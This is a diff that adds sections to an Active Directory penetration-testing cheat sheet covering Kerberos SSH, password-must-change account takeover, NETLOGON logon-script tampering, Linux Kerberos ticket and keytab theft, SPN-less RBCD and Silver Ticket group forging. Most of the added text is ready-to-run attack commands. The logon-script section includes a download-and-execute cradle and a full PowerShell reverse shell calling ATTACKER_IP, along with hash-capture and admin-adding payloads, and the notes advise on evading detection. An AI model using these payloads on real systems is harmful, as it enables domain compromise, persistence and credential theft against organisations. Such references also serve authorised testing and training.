@@ -102,8 +102,29 @@ Modern hardened DCs may disable NTLM entirely (Group Policy: *Network security: 
 | `nxc smb <DC_IP> -u '<USER>' -p '<PASSWORD>' --gen-relay-list /dev/null` | "NTLM authentication is disabled" |
 | `impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip <DC_IP>` | `KDC_ERR_PREAUTH_FAILED` *with valid creds* — NTLM blocked, fallback to Kerberos didn't fire |
 | `smbclient -L //<DC_IP> -U '<USER>'` | `NT_STATUS_LOGON_FAILURE` despite known-good password |
+| `nxc smb <DC_IP> -u '<USER>' -p '<PASSWORD>'` | `STATUS_ACCOUNT_RESTRICTION` — user is in **Protected Users** group (NTLM disabled per-account, not DC-wide) |
 
-> **Heuristic:** known-good creds + `STATUS_NOT_SUPPORTED` on SMB = NTLM disabled. Re-issue every command with `-k` from here on.
+> **Heuristic:** known-good creds + `STATUS_NOT_SUPPORTED` on SMB = NTLM disabled DC-wide. Known-good creds + `STATUS_ACCOUNT_RESTRICTION` = user is in the Protected Users security group (NTLM disabled for that principal only). Either way, re-issue every command with `-k` from here on.
+
+**Protected Users differentiation:** `STATUS_ACCOUNT_RESTRICTION` (NTSTATUS `0xC000015B`) is the specific error when the account itself cannot use NTLM — typically because it is a member of the `Protected Users` group (SID `S-1-5-21-<DOMAIN_SID>-525`). Unlike DC-wide NTLM disablement (`STATUS_NOT_SUPPORTED`), other accounts on the same DC still authenticate via NTLM. The pivot is identical — switch to Kerberos — but the root cause matters for understanding which accounts will and won't work with NTLM relay/PtH.
+
+```bash
+# Confirm Protected Users membership for a specific account
+ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' \
+    -b "DC=<DOMAIN>,DC=<TLD>" "(&(objectClass=group)(cn=Protected Users))" member
+
+# Or from netexec:
+netexec ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' \
+    --query '(&(objectClass=group)(cn=Protected Users))' member
+```
+
+```powershell
+# LOTL — check if a specific user is in Protected Users
+([adsisearcher]"(&(objectClass=group)(cn=Protected Users))").FindOne().Properties.member |
+    Where-Object { $_ -match '<TARGET_USER>' }
+```
+
+> **Impact on attack paths:** Protected Users members cannot be targeted with PtH, NTLM relay, or delegation (S4U2Self returns non-forwardable tickets). When impersonating via RBCD/constrained delegation, pick a high-priv user who is NOT in Protected Users.
 
 ```bash
 # 1. Auto-generate krb5.conf from the DC (NetExec ≥ 1.5.1 required for --generate-krb5-file)
@@ -138,6 +159,77 @@ evil-winrm -i <DC_FQDN> -u '<USER>' -r <DOMAIN>          # -r = realm, ccache fr
 > - `Server not found in Kerberos database` → using IP instead of FQDN, or `/etc/hosts` not set
 > - `KDC_ERR_S_PRINCIPAL_UNKNOWN` → SPN doesn't exist for the service you're hitting (try `cifs/<DC_FQDN>` or `host/<DC_FQDN>` explicitly)
 > - `KRB5CCNAME` unset → ticket exists but tools don't see it; `export KRB5CCNAME=<file>.ccache` and re-run
+
+### 1.0.6 SSH via Kerberos GSSAPI (Windows OpenSSH + Linux Hosts)
+
+When a target runs OpenSSH with password authentication disabled but GSSAPI enabled (common on hardened Windows servers and domain-joined Linux hosts), authenticate using a Kerberos TGT. Requires a valid ccache (from getTGT, kinit, or Pass-the-Ticket) and correct `/etc/krb5.conf` (set up in 1.0.5).
+
+**Pre-conditions:**
+- Target sshd has `GSSAPIAuthentication yes` in `sshd_config`
+- Target host has a `host/<FQDN>` SPN registered in AD
+- Your `/etc/krb5.conf` points to the correct KDC (set up in 1.0.5)
+- You hold a valid TGT in your ccache (KRB5CCNAME exported)
+
+```bash
+# 1. Acquire TGT (if not already cached)
+impacket-getTGT '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
+export KRB5CCNAME=$(pwd)/<USER>.ccache
+klist    # verify TGT is valid and not expired
+
+# 2. SSH with GSSAPI — the -K flag is shorthand for GSSAPIAuthentication=yes
+ssh -K <USER>@<TARGET_FQDN>
+
+# Explicit options (when -K alone fails or isn't available):
+ssh -o GSSAPIAuthentication=yes -o GSSAPIDelegateCredentials=yes <USER>@<TARGET_FQDN>
+
+# Delegate credentials to the remote host (enables double-hop from the SSH session)
+ssh -o GSSAPIAuthentication=yes -o GSSAPIDelegateCredentials=yes <USER>@<TARGET_FQDN>
+# On the remote host, `klist` will show the delegated TGT
+
+# 3. If target is Windows OpenSSH — username format may need DOMAIN\USER or user@DOMAIN
+ssh -o GSSAPIAuthentication=yes '<DOMAIN>\\<USER>'@<TARGET_FQDN>
+ssh -o GSSAPIAuthentication=yes '<USER>@<DOMAIN>'@<TARGET_FQDN>
+```
+
+```bash
+# Using kinit instead of impacket-getTGT (native MIT Kerberos client)
+kinit '<USER>@<REALM>'    # REALM = uppercase DOMAIN (e.g., CORP.LOCAL)
+# Enter password at prompt
+klist                      # verify TGT
+ssh -K <USER>@<TARGET_FQDN>
+```
+
+**Troubleshooting:**
+```bash
+# Debug GSSAPI negotiation failures
+ssh -vvv -o GSSAPIAuthentication=yes <USER>@<TARGET_FQDN> 2>&1 | grep -i 'gssapi\|kerberos\|gss'
+
+# Common failures:
+# "No Kerberos credentials available" → KRB5CCNAME not set or TGT expired
+# "Server not found in Kerberos database" → /etc/hosts missing FQDN, or host/<FQDN> SPN not registered
+# "GSSAPI Error: Unspecified GSS failure" → clock skew (re-sync: sudo ntpdate <DC_IP>)
+# "Permission denied (publickey,gssapi-with-mic)" → GSSAPI not enabled in target sshd_config
+```
+
+#### Living-off-the-land / LOTL variant
+
+```powershell
+# From a Windows foothold with a Kerberos ticket cached (runas /netonly or domain-joined):
+# Windows native ssh.exe (Win10 1809+) supports GSSAPI natively when domain-joined
+ssh.exe -o GSSAPIAuthentication=yes <USER>@<TARGET_FQDN>
+
+# Or with PuTTY (if present): Connection → SSH → Auth → GSSAPI → check "Attempt GSSAPI auth"
+# PuTTY uses the Windows SSPI stack (equivalent to GSSAPI) — just needs a TGT in the session
+```
+
+```cmd
+:: Verify the host SPN exists before attempting GSSAPI (missing SPN = guaranteed failure)
+setspn -Q host/<TARGET_FQDN>
+:: Or via LDAP from Linux:
+:: ldapsearch ... "(servicePrincipalName=host/<TARGET_FQDN>)" sAMAccountName
+```
+
+> **When to use this:** Password auth disabled, no SSH keys available, but you have domain creds or a ccache. Common in CPTS lab scenarios where Windows OpenSSH is the only remote-access vector and RDP/WinRM are blocked.
 
 ### 1.1 DNS Enumeration
 ```bash
@@ -289,6 +381,64 @@ for /F %u in (users.txt) do @(
 ```
 
 > **OPSEC:** LDAP-bind sprays generate Event 4625 on the DC with `LogonType=3` and `Status=0xC000006A` for bad password. Pace requests under the observation window. Always exclude the `krbtgt` account and any disabled accounts from the userlist.
+
+### 1.5b STATUS_PASSWORD_MUST_CHANGE — Detection & Password Reset via SAMR
+
+During password spraying, `STATUS_PASSWORD_MUST_CHANGE` (NTSTATUS `0xC0000224`) indicates the credentials are valid but the account requires a password change at next logon. This is a free account takeover — you know the current password and can reset it to one you control without any ACL rights (the SAMR protocol permits self-change when the old password is known).
+
+**Detection during spray:**
+```bash
+# netexec flags this status explicitly in output
+netexec smb <DC_IP> -u users.txt -p '<PASSWORD>' --continue-on-success 2>&1 | grep -i 'PASSWORD_MUST_CHANGE'
+# Output line:  SMB  <IP>  445  <HOST>  [-] <DOMAIN>\<USER>:<PASS> STATUS_PASSWORD_MUST_CHANGE
+
+# impacket tools return: "[-] SMB SessionError: STATUS_PASSWORD_MUST_CHANGE"
+# smbclient returns: "NT_STATUS_PASSWORD_MUST_CHANGE"
+```
+
+**Reset the password (self-change via SAMR — no special ACLs needed):**
+```bash
+# Method 1: impacket-changepasswd (direct SAMR self-change)
+impacket-changepasswd '<DOMAIN>/<USER>:<OLD_PASSWORD>'@<DC_IP> -newpass '<NEW_PASSWORD>'
+
+# Method 2: smbpasswd (Linux native — simple and reliable)
+smbpasswd -r <DC_IP> -U '<USER>'
+# Prompts for old password then new password
+
+# Method 3: rpcclient setuserinfo2
+rpcclient -U '<DOMAIN>/<USER>%<OLD_PASSWORD>' <DC_IP> -c "setuserinfo2 <USER> 23 '<NEW_PASSWORD>'"
+
+# Method 4: impacket-smbpasswd (alternative wrapper)
+impacket-smbpasswd '<DOMAIN>/<USER>:<OLD_PASSWORD>'@<DC_IP> -newpass '<NEW_PASSWORD>'
+```
+
+```bash
+# Verify the new password works
+netexec smb <DC_IP> -u '<USER>' -p '<NEW_PASSWORD>'
+# Should show [+] (success) instead of STATUS_PASSWORD_MUST_CHANGE
+```
+
+#### Living-off-the-land / LOTL variant
+
+```powershell
+# From a Windows pivot — native net user password change (SAMR self-change)
+net user <USER> <NEW_PASSWORD> /domain
+
+# PowerShell — DirectoryServices self-change (no RSAT)
+$ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('Domain','<DOMAIN>','<DC_FQDN>')
+$u = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity($ctx,'<USER>')
+$u.ChangePassword('<OLD_PASSWORD>','<NEW_PASSWORD>')
+```
+
+```cmd
+:: Pure cmd.exe — net user self-change
+net use \\<DC_FQDN>\IPC$ /user:<DOMAIN>\<USER> <OLD_PASSWORD>
+net user <USER> <NEW_PASSWORD> /domain
+```
+
+> **Key distinction from ForceChangePassword (4.6):** ForceChangePassword is an ACL-based right that lets you reset *another user's* password without knowing their current one. STATUS_PASSWORD_MUST_CHANGE is a self-service reset where you *know* the old password and just need to satisfy the "must change at next logon" flag. No special permissions required — any user can change their own password.
+
+> **OPSEC:** Password change generates Event 4723 (self-change) on the DC. This is normal helpdesk activity and typically not alerted on. The real tell is the preceding spray — pace attempts under the observation window.
 
 ### 1.6 LLMNR / NBT-NS Poisoning (LAN Access Required)
 
@@ -636,6 +786,95 @@ netexec smb <DC_IP> -u '<USER>' -p '<PASSWORD>' -M gpp_password
 
 > **OPSEC:** Reading NETLOGON triggers Event 5145 on the DC, but every domain logon already reads NETLOGON — that's background noise. Recursive grep across the full SYSVOL Policies tree is the volumetric tell; cap depth and filter extensions to stay under the radar.
 
+### 2.6c NETLOGON / SYSVOL Logon Script Tampering (Write Access)
+
+When you have WRITE access to `\\<DC_FQDN>\NETLOGON` or `\\<DC_FQDN>\SYSVOL\<DOMAIN>\scripts\`, append a payload to an existing logon script. Every user whose GPO references that script will execute your code at next logon. This is distinct from GPO abuse (4.7) which creates NEW scheduled tasks/scripts — here you modify an EXISTING script already assigned to users.
+
+**Discover writable scripts:**
+```bash
+# From Linux — check write perms on NETLOGON scripts
+smbmap -H <DC_IP> -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' -R NETLOGON --depth 5 2>&1 | grep -i 'READ, WRITE\|RW'
+
+# smbcacls — check ACL on a specific file
+smbcacls '//<DC_FQDN>/NETLOGON' '<SCRIPT_NAME>.bat' -U '<DOMAIN>/<USER>%<PASSWORD>'
+
+# netexec — spider + permissions
+netexec smb <DC_IP> -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' --shares 2>&1 | grep -i 'NETLOGON\|SYSVOL'
+```
+
+```powershell
+# From Windows pivot — test write access
+$scripts = Get-ChildItem "\\<DC_FQDN>\NETLOGON" -Recurse -Include *.bat,*.cmd,*.ps1,*.vbs
+foreach ($s in $scripts) {
+    try { [System.IO.File]::OpenWrite($s.FullName).Close(); "[WRITABLE] $($s.FullName)" }
+    catch { }
+}
+```
+
+**Exploit — append payload to an existing .bat logon script:**
+```bash
+# Method 1: smbclient append (one-liner reverse shell trigger)
+echo '' | smbclient '//<DC_FQDN>/NETLOGON' -U '<DOMAIN>/<USER>%<PASSWORD>' \
+    -c 'put - <SCRIPT_NAME>.bat' --append
+
+# Prepare the payload line to append
+cat <<'PAYLOAD' > /tmp/append.txt
+
+:: --- appended ---
+powershell -ep bypass -w hidden -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>:<PORT>/shell.ps1')"
+PAYLOAD
+
+# Append to the script on NETLOGON
+smbclient '//<DC_FQDN>/NETLOGON' -U '<DOMAIN>/<USER>%<PASSWORD>' -c "append /tmp/append.txt <SCRIPT_NAME>.bat"
+```
+
+```bash
+# Method 2: Download → modify → re-upload
+smbclient '//<DC_FQDN>/NETLOGON' -U '<DOMAIN>/<USER>%<PASSWORD>' -c "get <SCRIPT_NAME>.bat /tmp/orig.bat"
+# Append payload
+echo 'net localgroup administrators <DOMAIN>\<USER> /add' >> /tmp/orig.bat
+# Or for hash capture:
+echo 'dir \\<ATTACKER_IP>\share' >> /tmp/orig.bat
+# Re-upload
+smbclient '//<DC_FQDN>/NETLOGON' -U '<DOMAIN>/<USER>%<PASSWORD>' -c "put /tmp/orig.bat <SCRIPT_NAME>.bat"
+```
+
+**Payload options (pick based on engagement goals):**
+```batch
+:: Add user to local admins on every host that runs this script
+net localgroup administrators <DOMAIN>\<USER> /add
+
+:: Trigger NTLMv2 auth to your Responder listener (passive cred capture)
+dir \\<ATTACKER_IP>\share >nul 2>&1
+
+:: Reverse shell (noisy but immediate)
+powershell -ep bypass -w hidden -nop -c "$c=New-Object Net.Sockets.TCPClient('<ATTACKER_IP>',<PORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"
+```
+
+```vbscript
+' Append to .vbs logon scripts — NTLMv2 leak via UNC reference
+CreateObject("WScript.Shell").Run "cmd /c dir \\<ATTACKER_IP>\share", 0, False
+```
+
+#### Living-off-the-land / LOTL variant
+
+```powershell
+# From a Windows pivot — native file append to NETLOGON script
+Add-Content -Path "\\<DC_FQDN>\NETLOGON\<SCRIPT_NAME>.bat" -Value "`r`nnet localgroup administrators <DOMAIN>\<USER> /add"
+
+# Or for .ps1 logon scripts:
+Add-Content -Path "\\<DC_FQDN>\NETLOGON\<SCRIPT_NAME>.ps1" -Value "`nInvoke-WebRequest -Uri http://<ATTACKER_IP>:<PORT>/shell.ps1 | iex"
+```
+
+```cmd
+:: Pure cmd.exe — echo append via UNC path
+echo net localgroup administrators <DOMAIN>\<USER> /add >> "\\<DC_FQDN>\NETLOGON\<SCRIPT_NAME>.bat"
+```
+
+> **Key difference from GPO abuse (4.7):** GPO abuse creates new GPO entries (SharpGPOAbuse `--AddComputerTask`). Script tampering modifies an already-deployed script — lower detection surface because no new GPO object appears in AD, and the script was already trusted/assigned. The modification shows as a file-system change only (no LDAP attribute change on the GPO object itself).
+
+> **OPSEC:** File modification on SYSVOL triggers Event 5145 (share object access) and potentially 4663 (file write audit). The tampered script runs in user context (not SYSTEM) unless the GPO assigns it as a startup script. Always save a backup of the original and restore after engagement.
+
 ### 2.7 dsquery — Native AD Enumeration (No Tools Required)
 ```powershell
 # dsquery is built into Windows Server — no tool upload needed
@@ -778,6 +1017,128 @@ impacket-ticketConverter ticket.kirbi ticket.ccache
 export KRB5CCNAME=/path/to/ticket.ccache
 impacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET_FQDN>
 ```
+
+### 3.4b Linux Kerberos Ccache Theft — Harvest & Pass-the-Ticket from Compromised Linux Host
+
+When you compromise a domain-joined Linux host (SSSD, Centrify, or MIT krb5), Kerberos ticket caches (ccache files) are stored on disk or in the kernel keyring. With root access, harvest these tickets and reuse them from your attacker box for lateral movement — no password cracking required.
+
+**Enumerate cached tickets:**
+```bash
+# Default ccache location: /tmp/krb5cc_<UID>
+ls -la /tmp/krb5cc_*
+
+# SSSD stores ccaches in a different location (Kerberos credential cache)
+ls -la /var/lib/sss/db/ccache_*
+ls -la /var/lib/sss/secrets/
+
+# Check the system default ccache type (FILE, KEYRING, KCM)
+grep -i 'default_ccache_name' /etc/krb5.conf
+# Common values:
+#   FILE:/tmp/krb5cc_%{uid}           → file-based, directly copyable
+#   KEYRING:persistent:%{uid}         → kernel keyring, needs keyctl
+#   KCM:                              → sssd-kcm daemon, needs kcm export
+
+# Per-process KRB5CCNAME — some processes set custom ccache paths
+for pid in /proc/[0-9]*/; do
+    env_file="${pid}environ"
+    [ -r "$env_file" ] && grep -z 'KRB5CCNAME' "$env_file" 2>/dev/null | tr '\0' '\n'
+done | sort -u
+
+# Enumerate keytab files (long-term keys, not tickets — but allow TGT generation)
+find / -name '*.keytab' -o -name 'krb5.keytab' 2>/dev/null
+ls -la /etc/krb5.keytab
+```
+
+**Steal FILE-based ccaches (most common):**
+```bash
+# Copy the ccache to your attacker box (already in usable format)
+cp /tmp/krb5cc_<UID> /tmp/stolen.ccache
+
+# Verify the ticket is valid
+KRB5CCNAME=/tmp/stolen.ccache klist
+
+# Use from attacker box — set KRB5CCNAME and go
+export KRB5CCNAME=/path/to/stolen.ccache
+impacket-psexec -k -no-pass '<DOMAIN>/<USER>@<TARGET_FQDN>'
+impacket-secretsdump -k -no-pass '<DOMAIN>/<USER>@<DC_FQDN>'
+netexec smb <TARGET_FQDN> -u '<USER>' -p '' -k --use-kcache
+```
+
+**Steal KEYRING-based ccaches (kernel keyring):**
+```bash
+# List keys in the user's keyring (requires root or same UID)
+keyctl show @u    # current user's session keyring
+keyctl show @s    # session keyring
+
+# For a specific UID's persistent keyring:
+keyctl show %:user:<UID>
+
+# Read the key data (binary ccache blob)
+keyctl pipe <KEY_ID> > /tmp/stolen.ccache
+
+# Alternative: enumerate all session keyrings via /proc
+for uid_dir in /proc/[0-9]*/; do
+    pid=$(basename "$uid_dir")
+    sessionid=$(cat /proc/$pid/sessionid 2>/dev/null)
+    [ -n "$sessionid" ] && keyctl rlist $sessionid 2>/dev/null && echo "PID=$pid"
+done
+```
+
+**Steal from SSSD KCM (sssd-kcm daemon):**
+```bash
+# SSSD stores ccaches in its secrets database (LDB format)
+# Location: /var/lib/sss/secrets/secrets.ldb (or .secrets.mkey for the master key)
+ls -la /var/lib/sss/secrets/
+
+# Use tdbdump (part of samba-common-bin) to read the LDB
+tdbdump /var/lib/sss/secrets/secrets.ldb 2>/dev/null | strings | grep -i 'krb5\|ccache'
+
+# Or extract directly with sssd tools if available
+sss_cache -E    # flush and re-read
+```
+
+**Use keytab files to generate fresh TGTs:**
+```bash
+# A keytab is a long-term key (like a password hash) — use it to get unlimited TGTs
+# Common locations: /etc/krb5.keytab (machine account), /home/<user>/*.keytab
+klist -k /etc/krb5.keytab    # list principals in the keytab
+
+# Get a TGT using the keytab (kinit)
+kinit -k -t /etc/krb5.keytab '<PRINCIPAL>'    # e.g., host/server.domain.com@DOMAIN.COM
+klist
+
+# From attacker box — impacket-getTGT with keytab
+impacket-getTGT '<DOMAIN>/<USER>' -keytab /path/to/stolen.keytab -dc-ip <DC_IP>
+export KRB5CCNAME=<USER>.ccache
+```
+
+**SSH ControlMaster socket hijacking (no root needed if socket is accessible):**
+```bash
+# SSH ControlMaster sockets allow multiplexing — if a user has an active ControlMaster
+# session, ANY process with access to the socket can piggyback without re-auth
+find /tmp -name 'ssh-*' -type s 2>/dev/null
+ls -la /tmp/ssh-*/agent.*
+ls -la /run/user/*/ssh-*
+
+# Hijack the socket (connect through the existing authenticated session)
+ssh -o 'ControlPath=/tmp/ssh-<HASH>/ctrl' -O check <TARGET_FQDN>
+ssh -S /tmp/ssh-<HASH>/ctrl <USER>@<TARGET_FQDN>
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# All commands above are native Linux tools — no external tooling needed
+# klist, kinit, keyctl, find, cat /proc/*/environ are all standard
+# The ccache format is directly usable by impacket without conversion
+
+# If you only have a .kirbi (Windows format) — convert:
+impacket-ticketConverter ticket.kirbi ticket.ccache
+# If you only have a ccache and need .kirbi for Rubeus:
+impacket-ticketConverter ticket.ccache ticket.kirbi
+```
+
+> **Priority targets:** Look for root-level ccaches (`krb5cc_0`), service accounts running as specific UIDs, and any process with `KRB5CCNAME` set to a non-default path. Machine keytabs (`/etc/krb5.keytab`) are gold — they provide unlimited TGT generation for the computer account, which often has RBCD-exploitable relationships.
 
 ### 3.5 OverPass-the-Hash (Pass-the-Key)
 ```bash
@@ -1557,6 +1918,96 @@ Remove-ADComputer FAKEPC -Confirm:$false
 - See **5.4** for dMSA-based RBCD-like abuse (BadSuccessor, Server 2025)
 - See **6.5 Shadow Credentials** for using key-trust auth instead of password — works when MAQ=0 but you have write access on a computer object
 - See **noPac (CVE-2021-42278/42287)** in 6.6 as an RBCD-adjacent full-domain compromise when any domain user has MAQ>0
+
+### 5.3b SPN-less RBCD — RBCD via User Account When MachineAccountQuota=0
+
+When `MachineAccountQuota=0` prevents creating new computer accounts, the classic RBCD path (5.3) fails. The SPN-less RBCD variant uses a **controlled user account** (no SPN required) as the delegating principal. Since user accounts lack SPNs, the S4U2Self ticket comes back encrypted with the session key (not a long-term service key), requiring the `-u2u` (User-to-User) flag in `getST.py` to handle the different encryption model.
+
+**Pre-conditions:**
+- `GenericAll` / `GenericWrite` / `WriteProperty(msDS-AllowedToActOnBehalfOfOtherIdentity)` over the target computer
+- A controlled user account (password known) — does NOT need an SPN
+- MAQ=0 (otherwise standard RBCD with a new computer account is simpler)
+
+**Attack chain:**
+```bash
+# 1. Confirm MAQ=0 (validates why we need this variant)
+ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' \
+    -b "DC=<DOMAIN>,DC=<TLD>" -s base ms-DS-MachineAccountQuota
+# Should return: 0
+
+# 2. Write RBCD delegation from the controlled USER account (not a computer$)
+# Use the controlled user's SID as the delegating principal
+impacket-rbcd -delegate-from '<CONTROLLED_USER>' -delegate-to '<TARGET_COMPUTER>$' \
+    -action 'write' '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
+
+# 3. Request S4U2Self ticket with -u2u (User-to-User mode)
+# -u2u handles the session-key-encrypted ticket that comes back for SPN-less accounts
+impacket-getST -spn 'cifs/<TARGET_COMPUTER>.<DOMAIN>' \
+    -impersonate Administrator \
+    -u2u \
+    '<DOMAIN>/<CONTROLLED_USER>:<CONTROLLED_USER_PASSWORD>' -dc-ip <DC_IP>
+
+# 4. Use the resulting ticket
+export KRB5CCNAME=Administrator@cifs_<TARGET_COMPUTER>.<DOMAIN>.ccache
+impacket-psexec -k -no-pass '<DOMAIN>/Administrator@<TARGET_COMPUTER>.<DOMAIN>'
+```
+
+**Alternative: session-key extraction + RC4 password trick (older impacket versions without -u2u):**
+```bash
+# If your impacket version lacks -u2u support:
+
+# 1. Get a TGT for the controlled user
+impacket-getTGT '<DOMAIN>/<CONTROLLED_USER>:<PASSWORD>' -dc-ip <DC_IP>
+export KRB5CCNAME=<CONTROLLED_USER>.ccache
+
+# 2. Request S4U2Self (will fail the proxy step, but gives us a ticket to inspect)
+impacket-getST -spn 'cifs/<TARGET_COMPUTER>.<DOMAIN>' \
+    -impersonate Administrator \
+    '<DOMAIN>/<CONTROLLED_USER>:<PASSWORD>' -dc-ip <DC_IP> 2>&1 || true
+
+# 3. Use describeTicket.py to extract the session key from the TGT
+impacket-describeTicket <CONTROLLED_USER>.ccache | grep -i 'session key'
+# Output: Session Key: <HEX_SESSION_KEY>
+
+# 4. Change the controlled user's password to the RC4 value of the session key
+# (this aligns the user's long-term key with the session key the KDC used)
+impacket-changepasswd '<DOMAIN>/<CONTROLLED_USER>:<PASSWORD>'@<DC_IP> \
+    -newpass '<DERIVED_FROM_SESSION_KEY>'
+# Or use smbpasswd:
+smbpasswd -r <DC_IP> -U '<CONTROLLED_USER>'
+
+# 5. Re-run getST with the new password (session key now matches)
+impacket-getST -spn 'cifs/<TARGET_COMPUTER>.<DOMAIN>' \
+    -impersonate Administrator \
+    '<DOMAIN>/<CONTROLLED_USER>:<NEW_PASSWORD>' -dc-ip <DC_IP>
+```
+
+```bash
+# Cleanup — remove the RBCD delegation
+impacket-rbcd -delegate-to '<TARGET_COMPUTER>$' -action 'flush' \
+    '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
+```
+
+#### Living-off-the-land / LOTL variant
+
+```powershell
+# Step 1: Write RBCD attribute using native RSAT (same as 5.3 LOTL variant)
+Set-ADComputer '<TARGET_COMPUTER>' -PrincipalsAllowedToDelegateToAccount (Get-ADUser '<CONTROLLED_USER>')
+
+# Step 2: The S4U chain still requires Rubeus with /u2u flag
+.\Rubeus.exe s4u /user:<CONTROLLED_USER> /rc4:<CONTROLLED_USER_NT_HASH> \
+    /impersonateuser:Administrator /msdsspn:cifs/<TARGET_COMPUTER>.<DOMAIN> /u2u /ptt
+
+# Verify
+dir \\<TARGET_COMPUTER>.<DOMAIN>\C$
+
+# Cleanup
+Set-ADComputer '<TARGET_COMPUTER>' -PrincipalsAllowedToDelegateToAccount $null
+```
+
+> **Why this works:** The KDC does not require the delegating account to have an SPN for S4U2Self — it only needs the msDS-AllowedToActOnBehalfOfOtherIdentity reference to resolve to a valid security principal. The `-u2u` flag tells getST to use the TGT session key for decryption (User-to-User Kerberos, RFC 4120 section 3.7) instead of the missing long-term service key.
+
+> **When to reach for this:** MAQ=0 + no existing controlled computer account + no Shadow Credentials path (PKINIT not available). This is the RBCD fallback that works with only a regular user account.
 
 ### 5.4 Delegated MSA (dMSA) Abuse — BadSuccessor
 Requires: `CreateChild` right on any OU (BloodHound edge). Affects Windows Server 2025 DCs.
@@ -2702,6 +3153,92 @@ impacket-ticketer -nthash <SERVICE_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAI
 impacket-ticketer -nthash <COMPUTER_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn host/<TARGET_FQDN> Administrator
 ```
 
+### 10.5b Silver Ticket with PAC Group RID Forging (In-Service Privilege Escalation)
+
+A standard Silver Ticket impersonates Administrator (RID 500) to a service. PAC group RID forging takes this further — inject arbitrary group RIDs into the ticket's PAC `KERB_VALIDATION_INFO.GroupIds` field. The target service reads these groups from the PAC to make authorization decisions (e.g., SQL Server checks for `sysadmin` group membership, IIS checks for custom application groups). Since a Silver Ticket never touches the DC, the forged PAC is never validated against AD — the service trusts whatever groups appear in the PAC.
+
+**Use case:** You have a service account hash (e.g., MSSQL service hash from Kerberoasting) but impersonating Administrator alone does not grant the access you need because the service performs group-based authz checks against the PAC.
+
+```bash
+# Forge a Silver Ticket with custom group RIDs injected into the PAC
+# -groups accepts comma-separated RIDs that populate GroupIds[] in KERB_VALIDATION_INFO
+impacket-ticketer \
+    -nthash <SERVICE_ACCOUNT_HASH> \
+    -domain-sid <DOMAIN_SID> \
+    -domain <DOMAIN> \
+    -spn <SERVICE_SPN>/<TARGET_FQDN> \
+    -groups 512,513,518,519,520,544,548,549,551 \
+    -user-id 500 \
+    Administrator
+
+# Group RID reference:
+#   512 = Domain Admins        518 = Schema Admins       544 = Administrators (builtin)
+#   513 = Domain Users         519 = Enterprise Admins   548 = Account Operators
+#   520 = Group Policy Owners  549 = Server Operators    551 = Backup Operators
+
+# Use the ticket
+export KRB5CCNAME=Administrator.ccache
+impacket-mssqlclient -k -no-pass '<DOMAIN>/Administrator@<TARGET_FQDN>'
+```
+
+```bash
+# Example: MSSQL sysadmin via Silver Ticket + custom group
+# MSSQL maps "BUILTIN\Administrators" (RID 544) to sysadmin by default
+impacket-ticketer \
+    -nthash <MSSQL_SVC_HASH> \
+    -domain-sid <DOMAIN_SID> \
+    -domain <DOMAIN> \
+    -spn MSSQLSvc/<TARGET_FQDN>:1433 \
+    -groups 512,544 \
+    -user-id 500 \
+    Administrator
+
+export KRB5CCNAME=Administrator.ccache
+impacket-mssqlclient -k -no-pass '<DOMAIN>/Administrator@<TARGET_FQDN>'
+# Should get sysadmin context due to RID 544 in PAC
+```
+
+```bash
+# Example: IIS/web app with custom AD group checks
+# If the app checks for a custom group (e.g., "WebAppAdmins" with RID 1337):
+impacket-ticketer \
+    -nthash <IIS_SVC_HASH> \
+    -domain-sid <DOMAIN_SID> \
+    -domain <DOMAIN> \
+    -spn http/<TARGET_FQDN> \
+    -groups 512,513,1337 \
+    -user-id 500 \
+    Administrator
+
+export KRB5CCNAME=Administrator.ccache
+# Access the web application or WinRM service with the custom group membership
+```
+
+```bash
+# AES variant (avoids RC4 downgrade IOC on the service)
+impacket-ticketer \
+    -aesKey <SERVICE_AES256_KEY> \
+    -domain-sid <DOMAIN_SID> \
+    -domain <DOMAIN> \
+    -spn cifs/<TARGET_FQDN> \
+    -groups 512,519,544 \
+    Administrator
+```
+
+#### Living-off-the-land / LOTL variant
+
+```powershell
+# Mimikatz — forge Silver Ticket with group injection
+.\mimikatz.exe "kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET_FQDN> /service:cifs /rc4:<SERVICE_HASH> /groups:512,544,519 /ptt" exit
+
+# Rubeus does not natively support Silver Ticket forging with custom groups.
+# Use mimikatz or impacket-ticketer for this technique.
+```
+
+> **Why the DC never catches this:** Silver Tickets are encrypted with the service's long-term key, not krbtgt. The DC is never consulted during TGS-REQ validation for the embedded PAC because the service itself decrypts and consumes the PAC directly. The only mitigation is PAC validation (the service calls the DC to verify the PAC signature) — this is NOT enabled by default on most services.
+
+> **Finding the right RIDs:** Use BloodHound or `ldapsearch` to discover which group RIDs a service checks. For MSSQL, `SELECT name, sid FROM sys.server_principals WHERE type='G'` reveals the mapped AD groups.
+
 ### 10.6 Skeleton Key
 ```powershell
 # https://github.com/gentilkiwi/mimikatz
@@ -3065,6 +3602,101 @@ impacket-ntlmrelayx -tf relay_targets.txt -smb2support
 
